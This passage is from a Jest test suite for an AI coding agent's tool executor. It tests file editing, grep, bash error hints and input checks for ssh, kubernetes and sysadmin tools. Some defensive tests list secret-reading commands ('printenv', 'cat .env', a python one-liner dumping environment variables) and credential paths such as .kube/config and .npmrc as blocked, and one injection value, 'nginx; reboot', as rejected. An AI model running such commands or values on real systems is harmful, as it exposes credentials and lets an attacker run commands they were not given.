      await executeTool("grep", { pattern: "const", path: tmpDir });
      const output = writeSpy.mock.calls.map((c) => c[0]).join("");
      expect(output).toContain("Searching");
      writeSpy.mockRestore();
    });

    it("bash uses its own progress indicator", async () => {
      const writeSpy = jest
        .spyOn(process.stderr, "write")
        .mockImplementation(() => {});
      await executeTool("bash", { command: "echo hi" });
      const output = writeSpy.mock.calls.map((c) => c[0]).join("");
      // bash has its own ToolProgress that shows command text
      expect(output).toContain("echo hi");
      writeSpy.mockRestore();
    });
  });

  // ─── edit_file fuzzy matching ──────────────────────────────
  describe("edit_file fuzzy matching", () => {
    it("succeeds with whitespace mismatch (tabs vs spaces)", async () => {
      const fp = path.join(tmpDir, "fuzzy-edit.txt");
      fs.writeFileSync(fp, "\tconst x = 1;\n\tconst y = 2;\n");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "  const x = 1;\n  const y = 2;",
        new_text: "  const x = 10;\n  const y = 20;",
      });
      expect(result).toContain("Edited");
      expect(result).toContain("fuzzy match");
      const content = fs.readFileSync(fp, "utf-8");
      expect(content).toContain("const x = 10;");
    });

    it("auto-fixes close typo mismatch (≤5% distance)", async () => {
      const fp = path.join(tmpDir, "fuzzy-error.txt");
      fs.writeFileSync(fp, 'const hello = "world";\n');
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: 'const helo = "world";',
        new_text: 'const hello = "earth";',
      });
      expect(result).toContain("auto-fixed");
      expect(result).toContain("Edited");
      const content = fs.readFileSync(fp, "utf-8");
      expect(content).toContain('const hello = "earth"');
    });

    it('shows "Most similar text" on moderate mismatch', async () => {
      const fp = path.join(tmpDir, "fuzzy-error-large.txt");
      fs.writeFileSync(fp, 'const hello = "world";\n');
      const result = await executeTool("edit_file", {
        path: fp,
        // ~30% different — above auto-fix threshold but within findMostSimilar range
        old_text: 'const xyz = "world";',
        new_text: 'const hello = "earth";',
      });
      expect(result).toContain("most similar at line");
      expect(result).toContain("Actual file content around line");
    });
  });

  // ─── patch_file fuzzy matching ─────────────────────────────
  describe("patch_file fuzzy matching", () => {
    it("succeeds with whitespace mismatch", async () => {
      const fp = path.join(tmpDir, "fuzzy-patch.txt");
      fs.writeFileSync(fp, "\tconst a = 1;\n\tconst b = 2;\n");
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "  const a = 1;", new_text: "  const a = 10;" }],
      });
      expect(result).toContain("Patched");
      expect(result).toContain("fuzzy match");
      const content = fs.readFileSync(fp, "utf-8");
      expect(content).toContain("const a = 10;");
    });
  });

  // ─── unknown tool ───────────────────────────────────────────
  describe("unknown tool", () => {
    it("returns error for unknown tool name", async () => {
      const result = await executeTool("unknown_tool", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown tool");
    });
  });

  // ─── auto-fix console logging ────────────────────────────────
  describe("auto-fix logging", () => {
    let logSpy;
    beforeEach(() => {
      logSpy = jest.spyOn(console, "log").mockImplementation(() => {});
    });
    afterEach(() => {
      logSpy.mockRestore();
    });

    function logOutput() {
      return logSpy.mock.calls.map((c) => c[0]).join("\n");
    }

    it("read_file logs auto-fixed path", async () => {
      // Create a file then read with wrong extension
      const fp = path.join(tmpDir, "readfix.js");
      fs.writeFileSync(fp, "hello");
      // Read with .ts extension (will auto-fix to .js)
      const result = await executeTool("read_file", {
        path: path.join(tmpDir, "readfix.ts"),
      });
      if (result.includes("hello")) {
        expect(logOutput()).toContain("auto-fixed path");
      }
    });

    it("edit_file logs auto-fixed path", async () => {
      const fp = path.join(tmpDir, "editfix.js");
      fs.writeFileSync(fp, "const a = 1;\n");
      const result = await executeTool("edit_file", {
        path: path.join(tmpDir, "editfix.ts"),
        old_text: "const a = 1;",
        new_text: "const a = 2;",
      });
      if (result.includes("Edited")) {
        expect(logOutput()).toContain("auto-fixed path");
      }
    });

    it("edit_file logs fuzzy whitespace match", async () => {
      const fp = path.join(tmpDir, "fuzzylog.txt");
      fs.writeFileSync(fp, "\tconst x = 1;\n");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "  const x = 1;",
        new_text: "  const x = 2;",
      });
      expect(result).toContain("Edited");
      expect(logOutput()).toContain("fuzzy whitespace match");
    });

    it("edit_file auto-fix logs matched text and line info", async () => {
      const fp = path.join(tmpDir, "autofix-log.txt");
      fs.writeFileSync(fp, 'const hello = "world";\n');
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: 'const helo = "world";',
        new_text: 'const hello = "earth";',
      });
      expect(result).toContain("auto-fixed");
      expect(result).toContain("matched:");
      expect(logOutput()).toContain("auto-fixed edit");
    });

    it("patch_file logs auto-fixed path", async () => {
      const fp = path.join(tmpDir, "patchfix.js");
      fs.writeFileSync(fp, "const a = 1;\n");
      const result = await executeTool("patch_file", {
        path: path.join(tmpDir, "patchfix.ts"),
        patches: [{ old_text: "const a = 1;", new_text: "const a = 2;" }],
      });
      if (result.includes("Patched")) {
        expect(logOutput()).toContain("auto-fixed path");
      }
    });
  });

  // ─── enrichBashError ───────────────────────────────────────────
  describe("enrichBashError", () => {
    const { enrichBashError } = require("../cli/tools");

    it("returns original output when no hints match", () => {
      expect(enrichBashError("some random output", "echo hello")).toBe(
        "some random output",
      );
    });

    it("hints for command not found (node)", () => {
      const result = enrichBashError("npx: command not found", "npx jest");
      expect(result).toContain("HINT");
      expect(result).toContain("Node.js");
    });

    it("hints for command not found (python)", () => {
      const result = enrichBashError(
        "python3: command not found",
        "python3 script.py",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Python");
    });

    it("hints for command not found (generic)", () => {
      const result = enrichBashError("foo: command not found", "foo --bar");
      expect(result).toContain("HINT");
      expect(result).toContain('"foo"');
      expect(result).toContain("not installed");
    });

    it("hints for MODULE_NOT_FOUND (npm package)", () => {
      const result = enrichBashError(
        "Cannot find module 'lodash'",
        "node app.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("npm install lodash");
    });

    it("hints for MODULE_NOT_FOUND (relative)", () => {
      const result = enrichBashError(
        "Cannot find module './foo'",
        "node app.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("import path");
    });

    it("hints for permission denied", () => {
      const result = enrichBashError(
        "EACCES: permission denied",
        "node server.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Permission denied");
    });

    it("hints for port already in use", () => {
      const result = enrichBashError(
        "EADDRINUSE: address already in use :3000",
        "node server.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("already in use");
    });

    it("hints for SyntaxError", () => {
      const result = enrichBashError(
        "SyntaxError: Unexpected token }",
        "node app.js",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Syntax error");
    });

    it("hints for TypeScript errors", () => {
      const result = enrichBashError(
        'error TS2304: Cannot find name "x"',
        "tsc",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("TypeScript");
    });

    it("hints for Jest failures", () => {
      const result = enrichBashError(
        "Test Suites: 1 failed, 1 total",
        "npx jest",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Test failures");
    });

    it("hints for not a git repo", () => {
      const result = enrichBashError(
        "fatal: not a git repository",
        "git status",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("git init");
    });

    it("hints for curl hostname resolution failure", () => {
      const result = enrichBashError(
        "curl: (6) Could not resolve host",
        "curl https://bad.example.com",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Hostname");
    });

    it("hints for curl connection refused", () => {
      const result = enrichBashError(
        "curl: (7) Failed to connect",
        "curl https://localhost:9999",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Service not running");
    });

    it("hints for curl HTTP error", () => {
      const result = enrichBashError(
        "curl: (22) HTTP error",
        "curl https://example.com/api",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("HTTP 4xx/5xx");
    });

    it("hints for curl timeout", () => {
      const result = enrichBashError(
        "curl: (28) timed out",
        "curl https://slow.example.com",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("timed out");
    });

    it("hints for curl SSL error", () => {
      const result = enrichBashError(
        "curl: (35) SSL connection error",
        "curl https://bad-ssl.com",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("SSL/TLS");
    });

    it("hints for SSH port forwarding failure", () => {
      const result = enrichBashError(
        "remote port forwarding failed for listen port 8080",
        "ssh -R 8080:localhost:3000 server",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("remote port forwarding");
    });

    it("hints for SSH timeout", () => {
      const result = enrichBashError("Connection timed out", "ssh user@host");
      expect(result).toContain("HINT");
      expect(result).toContain("SSH connection timed out");
    });

    it("hints for address already in use (bind)", () => {
      const result = enrichBashError(
        "bind: Address already in use",
        "ssh -L 8080:host:80 server",
      );
      expect(result).toContain("HINT");
      expect(result).toContain("Port is already in use");
    });
  });

  // ─── getBlockedHint (via bash BLOCKED) ─────────────────────────
  describe("getBlockedHint (via bash BLOCKED)", () => {
    it("hints for printenv", async () => {
      const result = await executeTool("bash", { command: "printenv" });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
      expect(result).toContain("secrets");
    });

    it("hints for cat .env", async () => {
      const result = await executeTool("bash", { command: "cat .env" });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("hints for cat credentials", async () => {
      const result = await executeTool("bash", {
        command: "cat /path/to/credentials.json",
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("hints for python -c", async () => {
      const result = await executeTool("bash", {
        command: 'python3 -c "import os; print(os.environ)"',
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });

    it("hints for node -e", async () => {
      const result = await executeTool("bash", {
        command: 'node -e "console.log(1)"',
      });
      expect(result).toContain("BLOCKED");
      expect(result).toContain("HINT");
    });
  });

  // ─── autoFixPath ───────────────────────────────────────────────
  describe("autoFixPath", () => {
    const { autoFixPath } = require("../cli/tools");

    it("returns null fixedPath for null input", async () => {
      const result = await autoFixPath(null);
      expect(result.fixedPath).toBeNull();
    });

    it("returns null fixedPath for nonexistent file", async () => {
      const result = await autoFixPath("/nonexistent/path/to/zzzzz.qqqq");
      expect(result.fixedPath).toBeNull();
    });
  });

  // ─── autoFixEdit ──────────────────────────────────────────────
  describe("autoFixEdit", () => {
    const { autoFixEdit } = require("../cli/tools");

    it("returns null when no similar text found", () => {
      const result = autoFixEdit(
        "hello world",
        "completely different text that is very long",
        "replacement",
      );
      expect(result).toBeNull();
    });

    it("returns null when similar text is above threshold", () => {
      const result = autoFixEdit(
        'const hello = "world";\n',
        'const XXXXXXXXXX = "world";',
        "replacement",
      );
      expect(result).toBeNull();
    });

    it("returns auto-fix for close match", () => {
      const result = autoFixEdit(
        'const hello = "world";\n',
        'const helo = "world";',
        'const hello = "earth";',
      );
      if (result) {
        expect(result.autoFixed).toBe(true);
        expect(result.content).toContain("earth");
      }
    });
  });

  // ─── grep output_mode and context ─────────────────────────────
  describe("grep output_mode and context", () => {
    it("supports files_with_matches mode", async () => {
      fs.writeFileSync(path.join(tmpDir, "mode.js"), "const foo = 1;\n");
      const result = await executeTool("grep", {
        pattern: "foo",
        path: tmpDir,
        output_mode: "files_with_matches",
      });
      expect(result).toContain("mode.js");
      // Should be just the file path, not content
      expect(result).not.toContain("const");
    });

    it("supports count mode", async () => {
      fs.writeFileSync(path.join(tmpDir, "cnt.js"), "foo\nfoo\nbar\n");
      const result = await executeTool("grep", {
        pattern: "foo",
        path: tmpDir,
        output_mode: "count",
      });
      expect(result).toContain("2");
    });

    it("supports context lines", async () => {
      fs.writeFileSync(
        path.join(tmpDir, "ctx.js"),
        "aaa\nbbb\nccc\nddd\neee\n",
      );
      const result = await executeTool("grep", {
        pattern: "ccc",
        path: tmpDir,
        context: 1,
      });
      expect(result).toContain("bbb");
      expect(result).toContain("ccc");
      expect(result).toContain("ddd");
    });

    it("supports before_context", async () => {
      fs.writeFileSync(path.join(tmpDir, "bc.js"), "aaa\nbbb\nccc\n");
      const result = await executeTool("grep", {
        pattern: "ccc",
        path: tmpDir,
        before_context: 1,
      });
      expect(result).toContain("bbb");
    });

    it("supports after_context", async () => {
      fs.writeFileSync(path.join(tmpDir, "ac.js"), "aaa\nbbb\nccc\n");
      const result = await executeTool("grep", {
        pattern: "aaa",
        path: tmpDir,
        after_context: 1,
      });
      expect(result).toContain("aaa");
    });

    it("supports type filter", async () => {
      fs.writeFileSync(path.join(tmpDir, "typed.js"), "findme\n");
      fs.writeFileSync(path.join(tmpDir, "typed.py"), "findme\n");
      const result = await executeTool("grep", {
        pattern: "findme",
        path: tmpDir,
        type: "js",
      });
      expect(result).toContain(".js");
      expect(result).not.toContain(".py");
    });

    it("supports offset and head_limit", async () => {
      // Create enough matches
      const lines = Array.from(
        { length: 20 },
        (_, i) => `match_line_${i}`,
      ).join("\n");
      fs.writeFileSync(path.join(tmpDir, "paginate.txt"), lines + "\n");
      const allResult = await executeTool("grep", {
        pattern: "match_line",
        path: tmpDir,
      });
      const limitedResult = await executeTool("grep", {
        pattern: "match_line",
        path: tmpDir,
        offset: 5,
        head_limit: 3,
      });
      // Limited result should have fewer matches than unrestricted
      expect(limitedResult.length).toBeLessThan(allResult.length);
    });

    it("returns error for invalid regex", async () => {
      fs.writeFileSync(path.join(tmpDir, "inv.js"), "test\n");
      const result = await executeTool("grep", {
        pattern: "[invalid",
        path: tmpDir,
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Invalid regex");
    });
  });

  // ─── read_file summary line ───────────────────────────────────
  describe("read_file summary", () => {
    it("includes file path, line count, and size", async () => {
      const fp = path.join(tmpDir, "summary.txt");
      fs.writeFileSync(fp, "line1\nline2\nline3\n");
      const result = await executeTool("read_file", { path: fp });
      expect(result).toContain("File:");
      expect(result).toContain("summary.txt");
      expect(result).toContain("4 lines");
      expect(result).toContain("bytes");
    });
  });

  // ─── edit_file strict mode ────────────────────────────────────
  describe("edit_file strict mode", () => {
    it("rejects fuzzy match in strict mode", async () => {
      const { getEditMode } = require("../cli/tool-tiers");
      getEditMode.mockReturnValueOnce("strict");

      const fp = path.join(tmpDir, "strict-test.txt");
      fs.writeFileSync(fp, "\tconst x = 1;\n");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: "  const x = 1;",
        new_text: "  const x = 2;",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
    });

    it("shows similar text in strict mode error", async () => {
      const { getEditMode } = require("../cli/tool-tiers");
      getEditMode.mockReturnValueOnce("strict");

      const fp = path.join(tmpDir, "strict-similar.txt");
      fs.writeFileSync(fp, 'const hello = "world";\n');
      const result = await executeTool("edit_file", {
        path: fp,
        old_text: 'const helo = "world";',
        new_text: 'const hello = "earth";',
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
      expect(result).toContain("Most similar text");
    });

    it("strict mode with no similar text found", async () => {
      const { getEditMode } = require("../cli/tool-tiers");
      getEditMode.mockReturnValueOnce("strict");

      const fp = path.join(tmpDir, "strict-none.txt");
      fs.writeFileSync(fp, "hello world\n");
      const result = await executeTool("edit_file", {
        path: fp,
        old_text:
          "completely different and very long text that will not match anything at all in the file",
        new_text: "replacement",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
    });
  });

  // ─── patch_file strict mode ───────────────────────────────────
  describe("patch_file strict mode", () => {
    it("rejects patch in strict mode when old_text not found", async () => {
      const { getEditMode } = require("../cli/tool-tiers");
      getEditMode.mockReturnValueOnce("strict");

      const fp = path.join(tmpDir, "strict-patch.txt");
      fs.writeFileSync(fp, "const a = 1;\n");
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [{ old_text: "const b = 2;", new_text: "const b = 3;" }],
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
    });

    it("strict mode shows similar text in error", async () => {
      const { getEditMode } = require("../cli/tool-tiers");
      getEditMode.mockReturnValueOnce("strict");

      const fp = path.join(tmpDir, "strict-patch-sim.txt");
      fs.writeFileSync(fp, 'const hello = "world";\n');
      const result = await executeTool("patch_file", {
        path: fp,
        patches: [
          { old_text: 'const helo = "world";', new_text: "replacement" },
        ],
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("strict mode");
      expect(result).toContain("Most similar text");
    });
  });

  // ─── write_file chmod +x ──────────────────────────────────────
  describe("write_file chmod +x", () => {
    it("applies chmod +x to .sh files", async () => {
      const fp = path.join(tmpDir, "script.sh");
      const result = await executeTool("write_file", {
        path: fp,
        content: "#!/bin/bash\necho hi",
      });
      expect(result).toContain("Written");
      expect(result).toContain("chmod +x");
    });

    it("applies chmod +x to shebang files", async () => {
      const fp = path.join(tmpDir, "runner");
      const result = await executeTool("write_file", {
        path: fp,
        content: "#!/usr/bin/env node\nconsole.log(1)",
      });
      expect(result).toContain("Written");
      expect(result).toContain("chmod +x");
    });
  });

  // ─── resolvePath edge cases ───────────────────────────────────
  describe("resolvePath edge cases", () => {
    it("blocks .docker/config.json", () => {
      expect(resolvePath("/home/user/.docker/config.json")).toBeNull();
    });

    it("blocks .kube/config", () => {
      expect(resolvePath("/home/user/.kube/config")).toBeNull();
    });

    it("blocks .npmrc", () => {
      expect(resolvePath("/home/user/.npmrc")).toBeNull();
    });

    it("blocks .gnupg paths", () => {
      expect(resolvePath("/home/user/.gnupg/trustdb.gpg")).toBeNull();
    });
  });

  // ─── task_list tool ───────────────────────────────────────────
  describe('executeTool("task_list")', () => {
    beforeEach(() => {
      jest.mock("../cli/tasks", () => ({
        createTasks: jest.fn().mockReturnValue([
          { id: "task-1", description: "First task" },
          { id: "task-2", description: "Second task" },
        ]),
        updateTask: jest.fn().mockReturnValue(true),
        getTaskList: jest.fn().mockReturnValue({
          name: "test",
          tasks: [{ id: "task-1", description: "First" }],
        }),
        renderTaskList: jest.fn().mockReturnValue("Task list rendered"),
        hasActiveTasks: jest.fn().mockReturnValue(true),
      }));
      jest.mock("../cli/ui", () => ({
        ...jest.requireActual("../cli/ui"),
        getActiveTaskProgress: jest.fn().mockReturnValue(null),
      }));
    });

    afterEach(() => {
      jest.unmock("../cli/tasks");
    });

    it("returns error for unknown action", async () => {
      const result = await executeTool("task_list", { action: "invalid" });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown task_list action");
    });

    it("returns error when create missing name", async () => {
      const result = await executeTool("task_list", {
        action: "create",
        tasks: ["a"],
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("requires name");
    });

    it("returns error when update missing task_id", async () => {
      const result = await executeTool("task_list", {
        action: "update",
        status: "done",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("requires task_id");
    });
  });

  // ─── switch_model tool ────────────────────────────────────────
  describe('executeTool("switch_model")', () => {
    it("returns error for unknown model", async () => {
      const result = await executeTool("switch_model", {
        model: "nonexistent-model-xyz",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown model");
    });
  });

  // ─── brain_write tool ─────────────────────────────────────────
  describe('executeTool("brain_write")', () => {
    it("returns error when name is missing", async () => {
      const result = await executeTool("brain_write", {
        content: "test",
        mode: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("name is required");
    });

    it("returns error when content is missing", async () => {
      const result = await executeTool("brain_write", {
        name: "test",
        mode: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("content is required");
    });

    it("returns error when mode is missing", async () => {
      const result = await executeTool("brain_write", {
        name: "test",
        content: "hello",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("mode is required");
    });
  });

  // ─── ssh tools error paths ────────────────────────────────────
  describe("ssh tool error paths", () => {
    it("ssh_exec returns error without server", async () => {
      const result = await executeTool("ssh_exec", { command: "ls" });
      expect(result).toContain("ERROR");
      expect(result).toContain("server is required");
    });

    it("ssh_exec returns error without command", async () => {
      const result = await executeTool("ssh_exec", { server: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command is required");
    });

    it("ssh_upload returns error without required params", async () => {
      const result = await executeTool("ssh_upload", { server: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("required");
    });

    it("ssh_download returns error without required params", async () => {
      const result = await executeTool("ssh_download", { server: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("required");
    });
  });

  // ─── k8s tools error paths ────────────────────────────────────
  describe("k8s tool error paths", () => {
    it("k8s_logs returns error without pod", async () => {
      const result = await executeTool("k8s_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("pod is required");
    });

    it("k8s_exec returns error without pod", async () => {
      const result = await executeTool("k8s_exec", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("pod is required");
    });

    it("k8s_exec returns error without command", async () => {
      const result = await executeTool("k8s_exec", { pod: "test-pod" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command is required");
    });

    it("k8s_apply returns error without file", async () => {
      const result = await executeTool("k8s_apply", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("file is required");
    });

    it("k8s_rollout returns error without action", async () => {
      const result = await executeTool("k8s_rollout", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("k8s_rollout returns error without deployment", async () => {
      const result = await executeTool("k8s_rollout", { action: "status" });
      expect(result).toContain("ERROR");
      expect(result).toContain("deployment is required");
    });

    it("gh_run_view returns error without run_id", async () => {
      const result = await executeTool("gh_run_view", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("run_id is required");
    });

    it("gh_workflow_trigger returns error without workflow", async () => {
      const result = await executeTool("gh_workflow_trigger", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("workflow is required");
    });
  });

  // ─── service_manage tool ──────────────────────────────────────
  describe('executeTool("service_manage")', () => {
    it("returns error without service", async () => {
      const result = await executeTool("service_manage", { action: "status" });
      expect(result).toContain("ERROR");
      expect(result).toContain("service is required");
    });

    it("returns error without action", async () => {
      const result = await executeTool("service_manage", { service: "nginx" });
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("returns error for invalid action", async () => {
      const result = await executeTool("service_manage", {
        service: "nginx",
        action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("invalid action");
    });

    it("rejects unsafe service names", async () => {
      const result = await executeTool("service_manage", {
        service: "nginx; reboot",
        action: "status",
      });
      expect(result).toContain("unsafe characters");
    });
  });

  // ─── service_logs tool ────────────────────────────────────────
  describe('executeTool("service_logs")', () => {
    it("returns error without service", async () => {
      const result = await executeTool("service_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("service is required");
    });
  });

  // ─── container tools error paths ──────────────────────────────
  describe("container tools error paths", () => {
    it("container_logs returns error without container", async () => {
      const result = await executeTool("container_logs", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });

    it("container_exec returns error without container", async () => {
      const result = await executeTool("container_exec", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });

    it("container_exec returns error without command", async () => {
      const result = await executeTool("container_exec", { container: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("command is required");
    });

    it("container_manage returns error without container", async () => {
      const result = await executeTool("container_manage", { action: "stop" });
      expect(result).toContain("ERROR");
      expect(result).toContain("container is required");
    });

    it("container_manage returns error without action", async () => {
      const result = await executeTool("container_manage", {
        container: "test",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("container_manage returns error for invalid action", async () => {
      const result = await executeTool("container_manage", {
        container: "test",
        action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("invalid action");
    });
  });

  // ─── deploy tool error paths ──────────────────────────────────
  describe('executeTool("deploy")', () => {
    it("returns error without server", async () => {
      const result = await executeTool("deploy", { remote_path: "/tmp" });
      expect(result).toContain("ERROR");
      expect(result).toContain("server is required");
    });

    it("returns error without remote_path", async () => {
      const result = await executeTool("deploy", { server: "test" });
      expect(result).toContain("ERROR");
      expect(result).toContain("remote_path is required");
    });

    it("returns error without local_path for rsync", async () => {
      const result = await executeTool("deploy", {
        server: "test",
        remote_path: "/tmp",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("local_path is required");
    });
  });

  // ─── sysadmin tool error paths ────────────────────────────────
  describe('executeTool("sysadmin")', () => {
    it("returns error without action", async () => {
      const result = await executeTool("sysadmin", {});
      expect(result).toContain("ERROR");
      expect(result).toContain("action is required");
    });

    it("returns error for unknown action", async () => {
      const result = await executeTool("sysadmin", {
        action: "unknown_action",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown sysadmin action");
    });

    it("package action returns error without package_action", async () => {
      const result = await executeTool("sysadmin", { action: "package" });
      expect(result).toContain("ERROR");
      expect(result).toContain("package_action is required");
    });

    it("user_manage returns error without user_action", async () => {
      const result = await executeTool("sysadmin", { action: "user_manage" });
      expect(result).toContain("ERROR");
      expect(result).toContain("user_action is required");
    });

    it("user_manage info returns error without user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "info",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage create returns error without user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "create",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage delete returns error without user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "delete",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage add_ssh_key returns error without user", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "add_ssh_key",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("user is required");
    });

    it("user_manage add_ssh_key returns error without key", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "add_ssh_key",
        user: "testuser",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("ssh_key is required");
    });

    it("user_manage returns error for unknown user_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "user_manage",
        user_action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown user_action");
    });

    it("firewall returns error without firewall_action", async () => {
      const result = await executeTool("sysadmin", { action: "firewall" });
      expect(result).toContain("ERROR");
      expect(result).toContain("firewall_action is required");
    });

    it("firewall allow returns error without port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "allow",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port is required");
    });

    it("firewall deny returns error without port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "deny",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port is required");
    });

    it("firewall remove returns error without port", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "remove",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("port is required");
    });

    it("firewall returns error for unknown firewall_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "firewall",
        firewall_action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown firewall_action");
    });

    it("cron returns error without cron_action", async () => {
      const result = await executeTool("sysadmin", { action: "cron" });
      expect(result).toContain("ERROR");
      expect(result).toContain("cron_action is required");
    });

    it("cron add returns error without schedule", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "add",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("schedule is required");
    });

    it("cron add returns error without command", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "add",
        schedule: "0 * * * *",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("command is required");
    });

    it("cron remove returns error without command", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "remove",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("command");
    });

    it("cron returns error for unknown cron_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "cron",
        cron_action: "invalid",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown cron_action");
    });

    it("ssl_check returns error without domain or cert_path", async () => {
      const result = await executeTool("sysadmin", { action: "ssl_check" });
      expect(result).toContain("ERROR");
      expect(result).toContain("domain or cert_path is required");
    });

    it("log_tail returns error without path", async () => {
      const result = await executeTool("sysadmin", { action: "log_tail" });
      expect(result).toContain("ERROR");
      expect(result).toContain("path is required");
    });

    it("service returns error without service_action", async () => {
      const result = await executeTool("sysadmin", { action: "service" });
      expect(result).toContain("ERROR");
      expect(result).toContain("service_action is required");
    });

    it("service returns error without service_name (except list_failed)", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "status",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("service_name is required");
    });

    it("service returns error for unknown service_action", async () => {
      const result = await executeTool("sysadmin", {
        action: "service",
        service_action: "invalid",
        service_name: "nginx",
      });
      expect(result).toContain("ERROR");
      expect(result).toContain("Unknown service_action");
    });

    it("kill_process returns error without pid or process_name", async () => {
      const result = await executeTool("sysadmin", { action: "kill_process" });
      expect(result).toContain("ERROR");
      expect(result).toContain("pid or process_name is required");
    });

    it("package install returns error (no packages or no pkg manager)", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "install",
      });
      expect(result).toContain("ERROR");
    });

    it("package remove returns error (no packages or no pkg manager)", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "remove",
      });
      expect(result).toContain("ERROR");
    });

    it("package update returns error (no packages or no pkg manager)", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "update",
      });
      expect(result).toContain("ERROR");
    });

    it("package returns error for unknown package_action (or no pkg manager)", async () => {
      const result = await executeTool("sysadmin", {
        action: "package",
        package_action: "invalid",
      });
      expect(result).toContain("ERROR");
    });
  });

  // ─── buildKubectlCmd (via k8s tools) ──────────────────────────
  describe("buildKubectlCmd coverage", () => {
    // buildKubectlCmd is not exported but tested indirectly through k8s tool calls
    // The k8s_pods tool triggers buildKubectlCmd
    // Skipped in CI: kubectl may be installed but will hang trying to reach a
